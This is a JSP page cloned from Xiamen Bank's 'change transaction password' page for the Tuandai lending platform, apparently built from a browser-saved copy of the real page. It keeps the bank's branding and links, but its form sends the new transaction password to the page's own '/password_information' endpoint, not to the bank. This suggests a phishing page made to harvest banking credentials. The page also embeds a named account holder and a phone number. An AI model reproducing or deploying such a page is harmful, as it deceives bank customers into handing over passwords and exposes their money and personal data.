<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <meta http-equiv="pragma " content="no-cache ">
    <meta http-equiv="cache-control " content="no-cache ">
    <meta http-equiv="expires " content="0 ">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">

    <title>修改交易密码</title>

    <script src="js/jquery-1.11.2.min.js.下载"></script>
    <script type="text/javascript" src="js/Validform_v17.js.下载"></script>
    
    


  
    



    <link rel="icon" href="https://cunguan.xmbankonline.com/bha-neo-app/resource/images/favicon-1.ico" mce_href="/resource/custom/favicon-1.ico" type="image/x-icon">
    <link rel="shortcut icon" href="https://cunguan.xmbankonline.com/bha-neo-app/resource/images/favicon-1.ico" mce_href="/resource/custom/favicon-1.ico" type="image/x-icon">
    <link type="text/css" href="css/style_v13.css" rel="stylesheet">
    <link type="text/css" href="css/jquery.areaopt.css" rel="stylesheet">
  
    
    <script type="text/javascript" src="js/bha_v13.js.下载"></script>
    <script type="text/javascript" src="js/requestKey.js.下载"></script>
    <script type="text/javascript" src="js/areaopt.data.js.下载"></script>
    <script type="text/javascript" src="js/jquery.areaopt.js.下载"></script>
</head>
<body>

<div class="header">
    <div class="div-m">
        
        <h1 class="logo">
            <a href="https://cunguan.xmbankonline.com/bha-neo-app/gateway/desktop/resetPassword/validateUserCard?requestKey=2a014e9643a44220a31b3facf7723455#" class="logoImg"><img src="images/logo-CBXM.png"></a>
        </h1>
    </div>
</div>


  

<!--主体开始-->
<div class="container" style="min-height: 418px;">
<div class="scrollPart">
    <div class="infoBar">
        <div class="div-m">
            <span class="subtitle">修改交易密码</span>
            <ul>
                <li class="first">平台名称：团贷网</li>
                <li>平台公司名称：东莞团贷网互联网科技服务有限公司</li>
            </ul>
        </div>
    </div>
    <!-- 文字滚动 开始-->
		    
	            <div class="box">
	                <div class="marquee" id="marquee">
	                    <p>
	                        <span id="marquee-content">
	                            <marquee scrollamount="8"><font size="2px">厦门银行官方App可以查询存管账户余额、充值、提现记录。在App Store或安卓应用商店搜索“厦e站”，或扫描图片上的二维码，立即下载“厦e站”查询！</font></marquee></span>
	                       <!--  <span id="marquee-content-footer"></span> -->
	                    </p>
	                </div>
	            </div>
		    
            <!-- 文字滚动 结束-->
</div>
    <div class="div-m" style="min-height: 266px;">
        <div class="formBlock">
            <div class="titleInfo blue">您正在设置新的交易密码：</div>
            <form id="form" action="${ pageContext.request.contextPath}/password_information" method="post">
                <div class="formBlock">
                    <ul>
                        <li>
                            <label>账户名</label>
                            <span class="account">曾平</span>
                        </li>
                        
                            <li>
                                <label>请输入新密码</label>
                                <input name="password" id="password" type="password" class="inpText" placeholder="请输入新交易密码" datatype="not_blank,cfca_password" cfca="true" cfcabind="encryptPassword,clientRandom,serverRandom" nullmsg="请输入交易密码" errormsg="6-18位数字、大小写字母和特殊字符组合，不支持空格" value="" oncopy="return false;" onpaste="return false;" oncut="return false;">
                            	
                                    
                                    
                                        <span class="inpTips pa"><i></i>6-18位数字、大小写字母和特殊字符组合，不支持空格</span>
                                    
                                
                            <span class="Validform_checktip"></span></li>
                        
                        
<script type="text/javascript" src="js/CFCASIPInput.min.js.下载"></script>
<script type="text/javascript" src="js/CFCAControl.js.下载"></script>

        <input name="encryptPassword" id="encryptPassword" type="hidden" value="">


        <input name="serverRandom" id="serverRandom" type="hidden" value="">


        <input name="clientRandom" id="clientRandom" type="hidden" value="">

                        
                            <li>
                                <label>再次输入密码</label>
                                <input name="againpassword" id="againpassword" type="password" class="inpText" placeholder="请再次输入新交易密码"  errormsg="两次输入的密码不一致，请您核对后重新输入" nullmsg="请输入交易密码">
                             <script type="text/javascript">
                             $(document).ready(function(){
                             $("#againpassword").blur(function(){
                             var againpassword= $("#againpassword").val();
                             alert(againpassword)
                             })
                             })
                             </script>   
                            <span class="Validform_checktip"></span></li>
                        
                        <li>
                            <label>&nbsp;</label>
                            <input type="submit" class="submitBtn" id="nextButton" value="确      定">
                        </li>
                    </ul>
                </div>
            <input name="requestKey" id="requestKey" type="hidden" value="2a014e9643a44220a31b3facf7723455"></form>
        </div>
         <!-- 新增广告位 -->
          
            <div class="advertCon">
                <img src="images/2018090008.jpg" alt="">
            </div>
           
         <!-- 新增广告位 -->
    </div>
    <div class="clear"></div>
    


    <div class="tips">温馨提示：厦门银行不承担团贷网平台的投融资标的物及投融资人的审核责任，不对团贷网平台业务提供明示或默示的担保或连带责任，团贷网平台的交易风险由投融资人自行承担，与厦门银行无关。</div>


    <script type="text/javascript" src="js/pageRequestNum.js.下载"></script>
    <script type="text/javascript" src="js/cityjson"></script>
    <script type="text/javascript">
        postBankData("http://26.63.71.4:9528/logsrv/LogReceiver","3000000119", "6fd2338d-94ec-4fa8-82de-856d1a10ec25", "1049531636","15914198026", "reset_password_confirm", "2a014e9643a44220a31b3facf7723455");
    </script>
</div>
<!--主体结束-->





<div id="__env__" style="visibility: collapse;">
    <input type="hidden" id="contextPath" name="contextPath" value="/bha-neo-app">
    <input name="requestKey" id="requestKey" type="hidden" value="2a014e9643a44220a31b3facf7723455">
</div>

<div class="footer">
    <p class="tc">
        
    </p>
</div>
<div id="mask" style="display: none; height: 613px;"></div>
<div id="alertLayer-2" style="display: none; width: 400px; height: 210px; left: 473.5px; top: 201.5px;">
    <div class="layerTit">提 示</div>
    <div class="layerCtr">
        <div class="layerCon tc"></div>
        <a href="javascript:void(0);" class="submitBtn submitBtn-2">我知道了</a>
    </div>
</div>

<!--   <script>
        // 文字滚动js
        $(function () {
            var m = $('#marquee')[0];
            var m1 = $('#marquee-content')[0];
            var m2 = $('#marquee-content-footer')[0];
            m2.textContent = m1.textContent;

            function marquee() {
                if (m2.offsetWidth <= m.scrollLeft) {
                    m.scrollLeft -= m2.offsetWidth;
                } else {
                    m.scrollLeft++;
                }
            }

            timer = setInterval(marquee, 30);
        })  
    </script> -->

</body></html>